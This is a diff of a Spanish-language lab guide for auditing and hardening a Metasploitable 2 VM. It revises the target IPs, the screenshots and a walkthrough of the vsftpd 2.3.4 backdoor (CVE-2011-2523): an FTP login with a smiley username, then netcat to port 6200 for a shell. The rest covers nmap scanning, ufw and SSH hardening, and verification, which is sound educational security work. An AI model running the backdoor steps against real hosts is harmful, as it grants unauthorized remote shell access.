@@ -189,7 +189,7 @@ Host is up (0.0012s latency).
 ### 3.1 Escaneo de Descubrimiento Completo de Puertos
 
 ```bash
-nmap -sS -p- --min-rate 5000 10.0.2.5
+nmap -sS -p- --min-rate 5000 192.168.50.20
 ```
 
 **Explicación comando por comando:**
@@ -234,7 +234,7 @@ PORT      STATE SERVICE
 
 > **Interpretación:** Metasploitable 2 expone 21+ servicios, muchos de ellos con versiones antiguas. Una superficie de ataque así es inaceptable en producción.
 
-> **`CAPTURA_05: Resultados del escaneo de Nmap — salida completa de `nmap -sS -p- --min-rate 5000 10.0.2.5` mostrando los puertos abiertos`**
+> **`CAPTURA_05: Resultados del escaneo de Nmap — salida completa de `nmap -sS -p- --min-rate 5000 192.168.50.20` mostrando los puertos abiertos`**
 
 ![alt text](<Captura de pantalla 2026-08-14 174235.png>)
 
@@ -286,28 +286,45 @@ Cada versión detectada se cruza contra bases de datos de vulnerabilidades públ
 
 ### 3.4 Verificación Práctica de una Vulnerabilidad (FTP Backdoor)
 
-Para evidenciar la CVE-2011-2523:
+Para evidenciar la CVE-2011-2523: El comportamiento de vsftpd 2.3.4 es que **la propia maquina víctima abre el puerto 6200** cuando recibe el usuario malicioso. Kali simplemente se conecta después a ese puerto.
 
 ```bash
-# Terminal 1: ponemos un listener (netcat) en el puerto 4444
-nc -lvnp 4444
+# Terminal 1: Comprobamos el estado inicial de los puertos 21 y 6200.
+nmap -p 21,6200 192.168.50.20
+```
+Respuesta esparada:
+
+```bash
+21/tcp     open
+6200/tcp   closed
 ```
 
 ```bash
 # Terminal 2: conectamos al FTP y enviamos el payload del backdoor
-ftp 10.0.2.5
+ftp 192.168.50.20
 # user: anonymous:) 
 # pass: password
 ```
 
-Si el exploit tiene éxito, la conexión del listener muestra una shell (`bash` o `sh`) que permite ejecutar comandos como el usuario que ejecuta el servicio.
+Si el exploit tiene éxito, la conexión muestra una shell (`bash` o `sh`) que permite ejecutar comandos como el usuario que ejecuta el servicio. En el caso que de un **error 421**, primero comprobaremos el estado nuevamente en la **Terminal 1** pero esta vez esparando la respuesta **6200/tcp   open**.
 
-> **`[CAPTURA_05b: Evidencia de la vulnerabilidad identificada — terminal mostrando el acceso a shell vía el backdoor de vsftpd 2.3.4 (CVE-2011-2523) y/o la respuesta del script `ftp-vsftpd-backdoor` de Nmap]`**
+Kali se conecta al puerto que acaba de abrir la víctima:
+
+```bash
+# Conexión al puerto 6200 (Netcat).
+nc -nv 192.168.50.20 6200
+```
+
+> **`CAPTURA_05b: Evidencia de la vulnerabilidad identificada — terminal mostrando el acceso a shell vía el backdoor de vsftpd 2.3.4 (CVE-2011-2523) y/o la respuesta del script `ftp-vsftpd-backdoor` de Nmap`**
+
+![alt text](<Captura de pantalla 2026-09-08 122206.png>)
+![alt text](<Captura de pantalla 2026-09-08 122222.png>)
+![alt text](<Captura de pantalla 2026-09-08 122337.png>)
 
 Alternativa segura con el script oficial de Nmap:
 
 ```bash
-nmap -sV -p21 --script ftp-vsftpd-backdoor 10.0.2.5
+nmap -sV -p21 --script ftp-vsftpd-backdoor 192.168.50.20
 ```
 
 > **Nota ética:** Todo el acceso se realiza contra la VM de laboratorio. **No se copia, modifica ni exfiltra ningún dato real.** El objetivo es validar la existencia de la falla para justificar la remediación.
@@ -315,13 +332,15 @@ nmap -sV -p21 --script ftp-vsftpd-backdoor 10.0.2.5
 ### 3.5 Análisis Web Complementario (opcional)
 
 ```bash
-nmap -p80 --script http-headers,http-methods 10.0.2.5
-curl -v http://10.0.2.5/
+nmap -p80 --script http-headers,http-methods 192.168.50.20
+curl -v http://192.168.50.20/
 ```
 
 **Explicación:** Los scripts de enumeración web detectan cabeceras ausentes (p. ej. `X-Frame-Options`, `Content-Security-Policy`) y métodos HTTP peligrosos habilitados (`PUT`, `DELETE`, `TRACE`).
 
-> **`[CAPTURA_05c: (Opcional) Análisis web — salida de `curl -v` y cabeceras HTTP del servidor Apache vulnerable]`**
+> **`CAPTURA_05c: (Opcional) Análisis web — salida de `curl -v` y cabeceras HTTP del servidor Apache vulnerable`**
+
+![alt text](<Captura de pantalla 2026-09-08 123705.png>)
 
 ### 3.6 Checklist de la Fase 2
 
@@ -360,7 +379,7 @@ En esta fase cambiamos de la óptica ofensiva a la **defensiva**: interpretamos 
 
 > **Conclusión de la matriz:** La prioridad de remediación es: **(1)** deshabilitar/eliminar los servicios comprometidos (FTP, Telnet, Samba vulnerable), **(2)** parchear o sustituir software EOL (Apache, MySQL), **(3)** endurecer servicios esenciales (SSH), y **(4)** aplicar firewall de red (ufw/iptables).
 
-> **`[CAPTURA_06a: Matriz de riesgos exportada — tabla de evaluación de riesgos (Sección 4.2) exportada a PDF/PNG desde el gestor de documentación para el portafolio]`**
+> **`CAPTURA_06a: Matriz de riesgos exportada — tabla de evaluación de riesgos (Sección 4.2) exportada a PDF/PNG desde el gestor de documentación para el portafolio`**
 
 ### 4.4 Checklist de la Fase 3
 
@@ -391,7 +410,7 @@ Accedemos a la VM objetivo y activamos el firewall:
 ```bash
 sudo ufw default deny incoming
 sudo ufw default allow outgoing
-sudo ufw allow 22/tcp
+sudo ufw allow 22/tcp #O "sudo allow from 192.168xxxxx" y permitimos el acceso SSh unicamente desde nuestra red.
 sudo ufw enable
 sudo ufw status verbose
 ```
@@ -420,7 +439,9 @@ To                         Action      From
 22/tcp (v6)                ALLOW       Anywhere (v6)
 ```
 
-> **`[CAPTURA_06: Aplicación del parche o cambio de configuración — salida de `sudo ufw status verbose` mostrando la política deny-by-default con solo SSH permitido]`**
+> **`CAPTURA_06: Aplicación del parche o cambio de configuración — salida de `sudo ufw status verbose` mostrando la política deny-by-default con solo SSH permitido`**
+
+![alt text](<Captura de pantalla 2026-09-08 131217.png>)
 
 ### 5.3 Paso 2: Deshabilitar Servicios Inseguros
 
@@ -490,7 +511,10 @@ sudo service ssh restart
 sudo sshd -t && echo "Config OK"
 ```
 
-> **`[CAPTURA_06b: Hardening de SSH — contenido de `/etc/ssh/sshd_config` con las directivas aplicadas y/o la salida de `sudo sshd -t` confirmando la configuración válida]`**
+> **`CAPTURA_06b: Hardening de SSH — contenido de `/etc/ssh/sshd_config` con las directivas aplicadas y/o la salida de `sudo sshd -t` confirmando la configuración válida`**
+
+![alt text](<Captura de pantalla 2026-09-08 133244.png>)
+![alt text](<Captura de pantalla 2026-09-08 133334.png>)
 
 ### 5.5 Paso 4: Actualización de Paquetes (Mitigación de EOL)
 
@@ -519,7 +543,9 @@ sudo ufw status numbered
 
 **Explicación:** `ufw deny` añade reglas explícitas de denegación, útil como **defensa en profundidad** si un servicio quedara activo accidentalmente.
 
-> **`[CAPTURA_06c: Política de firewall — salida de `sudo ufw status numbered` con las reglas de deny y allow listadas]``
+> **`CAPTURA_06c: Política de firewall — salida de `sudo ufw status numbered` con las reglas de deny y allow listadas`**
+
+![alt text](<Captura de pantalla 2026-09-08 133802.png>)
 
 ### 5.7 Checklist de la Fase 4
 
@@ -538,7 +564,7 @@ sudo ufw status numbered
 Desde Kali, repetimos el escaneo de descubrimiento para verificar que los puertos se cerraron:
 
 ```bash
-nmap -sS -p- --min-rate 5000 10.0.2.5
+nmap -sS -p- --min-rate 5000 192.168.50.20
 ```
 
 **Explicación:** El mismo comando de la Fase 2. Si el hardening es exitoso, el número de puertos abiertos debe reducirse drásticamente (idealmente solo `22/tcp`).
@@ -547,7 +573,7 @@ Salida esperada tras la remediación:
 
 ```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-14 11:00 UTC
-Nmap scan report for 10.0.2.5
+Nmap scan report for 192.168.50.20
 Host is up (0.0006s latency).
 Not shown: 65534 closed tcp ports (reset)
 PORT   STATE SERVICE
@@ -556,14 +582,16 @@ PORT   STATE SERVICE
 
 > **Interpretación:** De 21+ puertos abiertos pasamos a **1 solo puerto (SSH/22)**, que además está endurecido (sin login por contraseña, sin root). La superficie de ataque se redujo más de un 95%.
 
-> **`[CAPTURA_07: Escaneo Nmap posterior demostrando el cierre del puerto/mitigación — salida del re-escaneo mostrando únicamente el puerto 22 abierto, comparada con la captura 04]`**
+> **`CAPTURA_07: Escaneo Nmap posterior demostrando el cierre del puerto/mitigación — salida del re-escaneo mostrando únicamente el puerto 22 abierto, comparada con la captura 04`**
+
+![alt text](<Captura de pantalla 2026-09-08 140250.png>)
 
 ### 6.2 Verificación de la Mitigación de la Vulnerabilidad
 
 Comprobamos que el FTP backdoor ya no es explotable:
 
 ```bash
-nmap -sV -p21 --script ftp-vsftpd-backdoor 10.0.2.5
+nmap -sV -p21 --script ftp-vsftpd-backdoor 192.168.50.20
 ```
 
 **Explicación:** Si el servicio está cerrado, Nmap reporta `closed` y el script no puede conectarse, demostrando la mitigación.
@@ -583,7 +611,7 @@ O bien, si el puerto sigue cerrado por firewall, Nmap muestra `filtered` (el paq
 Desde Kali, intenta el acceso con clave y verifica el banner:
 
 ```bash
-ssh -i ~/.ssh/lab_key msfadmin@10.0.2.5
+ssh -i ~/.ssh/lab_key msfadmin@192.168.50.20
 ```
 
 **Explicación:** Confirma que el acceso sigue operativo con la política aplicada (clave pública únicamente).
@@ -602,15 +630,13 @@ ssh -i ~/.ssh/lab_key msfadmin@10.0.2.5
 
 > `*` Dependiendo de la política aplicada, HTTP puede permanecer abierto si el negocio lo requiere; en ese caso debe reconstruirse sobre una versión parcheada y con cabeceras de seguridad.
 
-> **`[CAPTURA_07b: Tabla comparativa de puertos antes/después — tabla exportada para el informe, con el antes y el después del hardening]`**
-
 ### 6.5 Checklist de la Fase 5
 
 - [ ] Re-escaneo completo ejecutado.
 - [ ] Únicamente `22/tcp` abierto (o los permitidos por política).
 - [ ] Script `ftp-vsftpd-backdoor` ya no reporta vulnerabilidad.
 - [ ] Acceso SSH por clave verificado.
-- [ ] Capturas `07` y `07b` tomadas.
+- [ ] Capturas `07` tomada.
 
 ---
 
@@ -618,7 +644,7 @@ ssh -i ~/.ssh/lab_key msfadmin@10.0.2.5
 
 ### 7.1 Resumen Ejecutivo de la Intervención
 
-Se auditaron **X** servicios expuestos en la VM objetivo, de los cuales **X** presentaban vulnerabilidades críticas (CVSS ≥ 9.0), incluyendo **ejecución remota de código sin autenticación** (CVE-2011-2523 en vsftpd y CVE-2007-2447 en Samba).
+Se auditaron **21+** servicios expuestos en la VM objetivo, de los cuales **2** presentaban vulnerabilidades críticas (CVSS ≥ 9.0), incluyendo **ejecución remota de código sin autenticación** (CVE-2011-2523 en vsftpd y CVE-2007-2447 en Samba).
 
 Tras la intervención de hardening:
 
@@ -670,19 +696,18 @@ Tras la intervención de hardening:
 | `CAPTURA_06b` | Configuración SSH endurecida | [ ] |
 | `CAPTURA_06c` | Reglas de firewall listadas | [ ] |
 | `CAPTURA_07` | Re-escaneo: solo puerto 22 abierto | [ ] |
-| `CAPTURA_07b` | Tabla comparativa antes/después | [ ] |
 
 ## Apéndice B: Comandos Rápidos (Cheat Sheet)
 
 ```bash
 # Fase 1 — Conectividad
 ip a
-ping -c 3 10.0.2.5
-nmap -sn 10.0.2.0/24
+ping -c 4 192.168.50.20
+nmap -sn 192.168.50.20
 
 # Fase 2 — Reconocimiento
-nmap -sS -p- --min-rate 5000 10.0.2.5
-nmap -sC -sV -p21,22,80,445,3306 10.0.2.5
+nmap -sS -p- --min-rate 5000 192.168.50.20
+nmap -sC -sV -p21,22,80,445,3306 192.168.50.20
 
 # Fase 4 — Hardening (en la VM objetivo)
 sudo ufw default deny incoming
@@ -695,18 +720,18 @@ sudo service ssh restart && sudo sshd -t
 sudo apt-get update && sudo apt-get upgrade -y
 
 # Fase 5 — Verificación
-nmap -sS -p- --min-rate 5000 10.0.2.5
-nmap -sV -p21 --script ftp-vsftpd-backdoor 10.0.2.5
-ssh -i ~/.ssh/lab_key msfadmin@10.0.2.5
+nmap -sS -p- --min-rate 5000 192.168.50.20
+nmap -sV -p21 --script ftp-vsftpd-backdoor 192.168.50.20
+ssh -i ~/.ssh/lab_key msfadmin@192.168.50.20
 ```
 
 ## Apéndice C: Referencias
 
-- NVD — National Vulnerability Database (nvd.nist.gov)
-- CVE Mitre (cve.mitre.org)
-- Exploit-DB (exploit-db.com)
-- Rapid7 — Metasploitable 2 (documentación oficial)
-- OWASP Top Ten 2021 (owasp.org)
-- CIS Benchmarks (cisecurity.org)
+- NVD — National Vulnerability Database (https://nvd.nist.gov/)
+- CVE Mitre (https://www.cve.org/)
+- Exploit-DB (https://www.exploit-db.com/)
+- Rapid7 — Metasploitable 2 (https://docs.rapid7.com/metasploit/metasploitable-2/)
+- OWASP Top Ten 2026(https://owasp.org/)
+- CIS Benchmarks (https://www.cisecurity.org/)
 - ISO/IEC 27002:2022 — Controles de seguridad de la información
 - NIST SP 800-40 — Guide to Enterprise Patch Management Planning
